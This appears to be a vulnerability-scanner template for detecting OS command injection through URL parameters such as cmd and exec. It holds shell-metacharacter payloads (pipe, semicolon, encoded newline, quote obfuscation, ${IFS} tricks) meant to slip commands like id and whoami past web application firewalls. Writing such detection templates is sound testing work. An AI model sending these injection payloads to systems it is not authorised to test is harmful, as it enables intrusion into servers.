http:
- matchers:
  - condition: or
    part: body
    regex:
    - uid=[0-9]+.*gid=[0-9]+
    - root|www-data|apache|daemon
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?cmd={{payload}}'
  - '{{BaseURL}}/?exec={{payload}}'
  - '{{BaseURL}}/?query={{payload}}'
  - '{{BaseURL}}/?file={{payload}}'
  payloads:
    payload:
    - '|id'
    - ;whoami
    - '%0awhoami'
    - ''';i''d'''''
    - '&&sleep${IFS}5'
  stop-at-first-match: true
id: advanced-rce-waf-bypass
info:
  author: thenawabx
  description: Targeted at bypassing OS command filters using shell metacharacters
    and encoding.
  name: Advanced Command Injection (RCE) with WAF Evasion
  severity: critical
  tags: rce, advanced, waf-bypass, os-command
